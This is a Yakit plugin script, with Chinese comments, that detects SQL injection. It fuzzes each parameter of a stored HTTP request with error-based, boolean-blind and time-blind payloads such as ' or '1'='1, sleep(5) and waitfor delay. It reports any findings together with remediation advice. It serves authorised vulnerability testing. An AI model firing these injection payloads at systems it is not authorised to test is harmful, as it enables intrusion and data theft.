__DESC__ = "SQL 注入检测工具，支持报错注入、布尔盲注和时间盲注，适用于 MySQL/PostgreSQL/MSSQL/Oracle 等数据库"
__VERBOSE_NAME__ = "SQL 注入检测"
__KEYWORDS__ = "sql-injection,sqli,blind-injection,error-based,boolean-based,time-based"

// 配置项
debug = false
threads = 5

// -------------------------------------------------------------------
// CLI 参数定义
// -------------------------------------------------------------------
flowIDStr = cli.String(
    "httpflow-id",
    cli.setVerboseName("HTTPFlowID"),
    cli.setHelp("History 中的 HTTPFlow ID,用于获取请求/响应包内容"),
    cli.setRequired(true),
)
cli.check()

// 辅助输出函数
aiOut = msg => {
    try {
        yakit.AIOutput(msg)
    } catch {
        println(msg)
    }
}

// -------------------------------------------------------------------
// 核心数据结构: Payload 定义
// -------------------------------------------------------------------

// 阶段1: 报错注入 Payload
errorPayloads = [
    {
        "payload": "'",
        "patterns": [
            `(?i)(sql|mysql|mariadb|postgresql|oracle|mssql|sqlite).*(syntax|error|warning)`,
            `(?i)(you have an error in your sql syntax)`,
            `(?i)(unclosed quotation mark)`,
            `(?i)(quoted string not properly terminated)`,
            `(?i)(unexpected end of sql command)`,
            `(?i)(syntax error.*sql)`,
            `(?i)(ORA-\d{5})`,
            `(?i)(SQLSTATE\[)`,
            `(?i)(Warning:.*mysql_)`,
            `(?i)(pg_query\(\)|pg_exec\(\))`,
            `(?i)(Microsoft SQL Native Client)`,
            `(?i)(ODBC SQL Server Driver)`,
            `(?i)(SQLite.*error)`,
        ],
        "desc": "单引号语法错误"
    },
    {
        "payload": "\"",
        "patterns": [
            `(?i)(sql|mysql|mariadb|postgresql|oracle|mssql).*(syntax|error)`,
            `(?i)(unclosed quotation)`,
            `(?i)(ORA-\d{5})`,
            `(?i)(SQLSTATE\[)`,
        ],
        "desc": "双引号语法错误"
    },
    {
        "payload": "' and 1=convert(int,@@version)--",
        "patterns": [
            `(?i)(convert|cast|version|sql server)`,
            `(?i)(syntax error|conversion failed)`,
        ],
        "desc": "MSSQL 报错测试"
    },
    {
        "payload": "1' and extractvalue(1,concat(0x7e,version()))--",
        "patterns": [
            `(?i)(XPATH syntax error|~[\d.]+)`,
            `(?i)(extractvalue|updatexml)`,
        ],
        "desc": "MySQL extractvalue 报错"
    },
]

// 阶段2: 布尔盲注 Payload
booleanPayloads = [
    {
        "true_payload": "' or '1'='1",
        "false_payload": "' or '1'='2",
        "desc": "基础布尔测试（单引号）"
    },
    {
        "true_payload": "\" or \"1\"=\"1",
        "false_payload": "\" or \"1\"=\"2",
        "desc": "基础布尔测试（双引号）"
    },
    {
        "true_payload": "1' or '1'='1",
        "false_payload": "1' or '1'='2",
        "desc": "数字+单引号布尔测试"
    },
    {
        "true_payload": "') or ('1'='1",
        "false_payload": "') or ('1'='2",
        "desc": "括号闭合布尔测试"
    },
    {
        "true_payload": "1 or 1=1",
        "false_payload": "1 or 1=2",
        "desc": "数字型布尔测试"
    },
    {
        "true_payload": "' and '1'='1",
        "false_payload": "' and '1'='2",
        "desc": "AND 逻辑布尔测试"
    },
    {
        "true_payload": "1' and '1'='1",
        "false_payload": "1' and '1'='2",
        "desc": "数字+单引号 AND 测试"
    },
]

// 阶段3: 时间盲注 Payload（多数据库）
timeBasedPayloads = [
    {
        "payload": "1' and sleep(5)-- ",
        "expected_delay": 4.0,
        "db": "MySQL",
        "desc": "MySQL SLEEP(5)"
    },
    {
        "payload": "1' and if(1=1,sleep(5),0)-- ",
        "expected_delay": 4.0,
        "db": "MySQL",
        "desc": "MySQL IF+SLEEP"
    },
    {
        "payload": "1'; waitfor delay '0:0:5'-- ",
        "expected_delay": 4.0,
        "db": "MSSQL",
        "desc": "MSSQL WAITFOR"
    },
    {
        "payload": "1' and pg_sleep(5)-- ",
        "expected_delay": 4.0,
        "db": "PostgreSQL",
        "desc": "PostgreSQL pg_sleep"
    },
    {
        "payload": "1' and (select*from(select(sleep(5)))a)-- ",
        "expected_delay": 4.0,
        "db": "MySQL",
        "desc": "MySQL 子查询 SLEEP"
    },
]

// -------------------------------------------------------------------
// 核心逻辑: 阶段1 - 报错注入检测
// -------------------------------------------------------------------

testErrorBased = func(param) {
    aiOut("  [1/3] 报错注入检测...")

    for i, p = range errorPayloads {
        aiOut(sprintf("    [%d/%d] 测试: %s", i+1, len(errorPayloads), p.desc))

        freq = param.Fuzz(p.payload)
        res, err = freq.ExecFirst()

        if res == nil { continue }

        body, err = str.ExtractBodyFromHTTPResponseRaw(res.ResponseRaw)
        if err != nil { continue }

        bodyStr = string(body)

        // 排除反射型：若响应包含完整 payload 且无 SQL 报错特征，可能是 XSS 反射
        if str.Contains(bodyStr, p.payload) {
            hasSqlError = false
            for _, pattern = range p.patterns {
                if re.Match(bodyStr, pattern) {
                    hasSqlError = true
                    break
                }
            }
            if !hasSqlError {
                continue
            }
        }

        for _, pattern = range p.patterns {
            matches = re.FindAll(bodyStr, pattern)
            if len(matches) > 0 {
                aiOut(sprintf("    ✓ 检测到 SQL 报错: %s", matches[0]))

                return {
                    "vulnerable": true,
                    "type": "error-based",
                    "payload": p.payload,
                    "error_pattern": matches[0],
                    "request": res.RequestRaw,
                    "response": res.ResponseRaw
                }
            }
        }
    }

    aiOut("    × 未检测到报错特征")
    return nil
}

// -------------------------------------------------------------------
// 核心逻辑: 阶段2 - 布尔盲注检测
// -------------------------------------------------------------------

abs = func(x) {
    if x < 0 { return -x }
    return x
}

max = func(a, b) {
    if a > b { return a }
    return b
}

testBooleanBased = func(param) {
    aiOut("  [2/3] 布尔盲注检测...")

    baselineRes, _ = param.Fuzz("normalvalue123").ExecFirst()
    if baselineRes == nil {
        aiOut("    ! 无法获取基线响应")
        return nil
    }

    baselineBody, _ = str.ExtractBodyFromHTTPResponseRaw(baselineRes.ResponseRaw)
    baselineLen = len(baselineBody)
    aiOut(sprintf("    → 基线响应长度: %d bytes", baselineLen))

    for i, p = range booleanPayloads {
        aiOut(sprintf("    [%d/%d] 测试: %s", i+1, len(booleanPayloads), p.desc))

        trueRes, _ = param.Fuzz(p.true_payload).ExecFirst()
        if trueRes == nil { continue }

        trueBody, _ = str.ExtractBodyFromHTTPResponseRaw(trueRes.ResponseRaw)
        trueLen = len(trueBody)

        falseRes, _ = param.Fuzz(p.false_payload).ExecFirst()
        if falseRes == nil { continue }

        falseBody, _ = str.ExtractBodyFromHTTPResponseRaw(falseRes.ResponseRaw)
        falseLen = len(falseBody)

        trueDiff = abs(trueLen - baselineLen)
        falseDiff = abs(falseLen - baselineLen)
        trueFalseDiff = abs(trueLen - falseLen)

        threshold1 = baselineLen > 0 && trueDiff < baselineLen*0.15 && falseDiff > baselineLen*0.1
        threshold2 = max(trueLen, falseLen) > 0 && trueFalseDiff > 20 && trueFalseDiff > max(trueLen, falseLen)*0.03

        trueBodyStr = string(trueBody)
        falseBodyStr = string(falseBody)
        hasSuccessKeyword = str.MatchAnyOfRegexp(trueBodyStr, `(?i)(success|welcome|login|valid|found|exists)`) &&
            !str.MatchAnyOfRegexp(falseBodyStr, `(?i)(success|welcome|login|valid|found|exists)`)
        hasFailureKeyword = str.MatchAnyOfRegexp(falseBodyStr, `(?i)(invalid|error|fail|denied|wrong|not found)`) &&
            !str.MatchAnyOfRegexp(trueBodyStr, `(?i)(invalid|error|fail|denied|wrong|not found)`)
        threshold3 = (hasSuccessKeyword || hasFailureKeyword) && trueFalseDiff > 10

        if threshold1 || threshold2 || threshold3 {
            aiOut(sprintf("    ✓ 检测到布尔盲注特征（差异: %d bytes）", trueFalseDiff))

            return {
                "vulnerable": true,
                "type": "boolean-blind",
                "true_payload": p.true_payload,
                "false_payload": p.false_payload,
                "true_length": trueLen,
                "false_length": falseLen,
                "diff": trueFalseDiff,
                "request": trueRes.RequestRaw,
                "response": trueRes.ResponseRaw
            }
        }
    }

    aiOut("    × 未检测到布尔盲注")
    return nil
}

// -------------------------------------------------------------------
// 核心逻辑: 阶段3 - 时间盲注检测
// -------------------------------------------------------------------

testTimeBased = func(param) {
    aiOut("  [3/3] 时间盲注检测...")

    totalTime = 0.0
    validTests = 0
    for i = 0; i < 3; i++ {
        baselineStart = time.Now()
        res, _ = param.Fuzz("normalvalue456").ExecFirst()
        if res != nil {
            totalTime += time.Since(baselineStart).Seconds()
            validTests++
        }
    }

    if validTests == 0 {
        aiOut("    ! 无法获取基线时间")
        return nil
    }

    baselineTime = totalTime / validTests
    aiOut(sprintf("    → 平均基线时间: %.2f 秒", baselineTime))

    threshold = 3.0

    for i, p = range timeBasedPayloads {
        aiOut(sprintf("    [%d/%d] 测试: %s (%s)", i+1, len(timeBasedPayloads), p.desc, p.db))

        injectionStart = time.Now()
        res, _ = param.Fuzz(p.payload).ExecFirst()
        injectionTime = time.Since(injectionStart).Seconds()

        if res == nil { continue }

        timeDiff = injectionTime - baselineTime
        aiOut(sprintf("      响应时间: %.2f 秒 (差异: %.2f 秒)", injectionTime, timeDiff))

        if timeDiff >= threshold {
            aiOut(sprintf("    ✓ 检测到时间延迟特征（延迟: %.2f 秒）", timeDiff))

            return {
                "vulnerable": true,
                "type": "time-blind",
                "payload": p.payload,
                "baseline_time": baselineTime,
                "injection_time": injectionTime,
                "time_diff": timeDiff,
                "db": p.db,
                "request": res.RequestRaw,
                "response": res.ResponseRaw
            }
        }
    }

    aiOut("    × 未检测到时间盲注")
    return nil
}

// -------------------------------------------------------------------
// 综合检测流程
// -------------------------------------------------------------------

fuzzSQLInjection = func(url, param) {
    aiOut(sprintf("\n正在检测参数: %s (%s)", param.Name(), param.PositionVerbose()))

    result = nil
    result = testErrorBased(param)
    if result != nil && result.vulnerable {
        return result
    }

    result = testBooleanBased(param)
    if result != nil && result.vulnerable {
        return result
    }

    result = testTimeBased(param)
    if result != nil && result.vulnerable {
        return result
    }

    return nil
}

// -------------------------------------------------------------------
// 风险上报
// -------------------------------------------------------------------

reportSQLInjection = func(url, param, result) {
    injectionType = result.type

    typeNames = {
        "error-based": "报错注入",
        "boolean-blind": "布尔盲注",
        "time-blind": "时间盲注",
    }

    typeName = typeNames[injectionType]
    severity = "high"

    if injectionType == "error-based" {
        severity = "critical"
    }

    title = sprintf("SQL 注入 (%s): %s", typeName, url)

    description = ""
    if injectionType == "error-based" {
        description = sprintf(
            "参数 %s 存在 SQL 注入漏洞（报错注入）。\n\n"+
                "检测到 SQL 报错信息: %s\n\n"+
                "攻击者可通过报错注入获取数据库版本、表结构、敏感数据等。\n\n"+
                "Payload: %s",
            param.Name(),
            result.error_pattern,
            result.payload
        )
    } else if injectionType == "boolean-blind" {
        description = sprintf(
            "参数 %s 存在 SQL 注入漏洞（布尔盲注）。\n\n"+
                "通过真/假条件测试，检测到响应差异: %d bytes\n"+
                "真条件响应长度: %d bytes\n"+
                "假条件响应长度: %d bytes\n\n"+
                "攻击者可通过布尔盲注逐字提取数据库数据。\n\n"+
                "Payload 示例: %s",
            param.Name(),
            result.diff,
            result.true_length,
            result.false_length,
            result.true_payload
        )
    } else if injectionType == "time-blind" {
        description = sprintf(
            "参数 %s 存在 SQL 注入漏洞（时间盲注）。\n\n"+
                "检测到明显时间延迟（疑似 %s）:\n"+
                "基线响应时间: %.2f 秒\n"+
                "注入响应时间: %.2f 秒\n"+
                "时间差异: %.2f 秒\n\n"+
                "攻击者可通过时间盲注提取敏感数据。\n\n"+
                "Payload: %s",
            param.Name(),
            result.db || "未知数据库",
            result.baseline_time,
            result.injection_time,
            result.time_diff,
            result.payload
        )
    }

    solution = `1. 使用参数化查询（Prepared Statement）或 ORM，禁止拼接 SQL。
2. 对用户输入进行严格的白名单验证。
3. 使用最小权限原则，限制数据库用户权限。
4. 避免在错误信息中暴露 SQL 细节。
5. 实施 WAF 规则过滤常见 SQL 注入 payload。
6. 定期进行安全审计和渗透测试。`

    aiOut(sprintf("✓ %s", title))

    payloadStr = ""
    if injectionType == "boolean-blind" {
        payloadStr = result.true_payload
    } else {
        payloadStr = result.payload
    }

    risk.NewRisk(
        url,
        risk.title(title),
        risk.titleVerbose(sprintf("SQL 注入漏洞 (%s)", typeName)),
        risk.type("sqli"),
        risk.severity(severity),
        risk.payload(payloadStr),
        risk.request(result.request),
        risk.response(result.response),
        risk.description(description),
        risk.solution(solution),
        risk.details({
            "injection_type": injectionType,
            "param_name": param.Name(),
            "param_position": param.PositionVerbose(),
            "detection_details": result
        })
    )
}

// -------------------------------------------------------------------
// 参数过滤
// -------------------------------------------------------------------

shouldSkipParam = func(paramName) {
    skipPatterns = [
        `(?i)^(page|limit|offset|sort|order|orderby)$`,
        `(?i)^(csrf|token|timestamp|nonce|_token)$`,
        `(?i)^(lang|locale|theme|skin)$`,
        `(?i)^(PHPSESSID|JSESSIONID|_ga|_gid)$`,
    ]

    for _, pattern = range skipPatterns {
        if str.MatchAnyOfRegexp(paramName, pattern) {
            return true
        }
    }

    return false
}

// -------------------------------------------------------------------
// 主程序入口
// -------------------------------------------------------------------

flowID = parseInt(flowIDStr)
flowsChan = db.QueryHTTPFlowsByID(flowID)
flow = nil
for f = range flowsChan {
    flow = f
    break
}

if flow == nil {
    aiOut(sprintf("HTTPFlow 查询失败: 未找到 ID 为 %v 的请求", flowID))
    return
}

reqBytes = flow.GetRequest()
if reqBytes == nil { reqBytes = []byte(flow.Request) }
if reqBytes == nil || len(reqBytes) == 0 {
    aiOut("请求包为空,无法检测")
    return
}

isHttps = flow.IsHTTPS
freq, err = fuzz.HTTPRequest(reqBytes, fuzz.https(isHttps))
if err != nil {
    aiOut(sprintf("解析请求失败: %v", err))
    return
}

aiOut(sprintf("开始 SQL 注入检测 (Target: %s)...", flow.Url))

allParams = freq.GetCommonParams()
validParams = []

for param in allParams {
    if !shouldSkipParam(param.Name()) {
        validParams = append(validParams, param)
    }
}

if len(validParams) == 0 {
    aiOut("未发现可测试的有效参数")
    return
}

aiOut(sprintf("发现 %d 个有效参数，开始检测...", len(validParams)))

foundCount = 0
for param in validParams {
    result = fuzzSQLInjection(flow.Url, param)

    if result != nil {
        reportSQLInjection(flow.Url, param, result)
        foundCount++
    }
}

if foundCount > 0 {
    aiOut(sprintf("\n=== SQL 注入检测完成，发现 %d 个漏洞 ===", foundCount))
} else {
    aiOut("\n=== SQL 注入检测完成，未发现漏洞 ===")
}
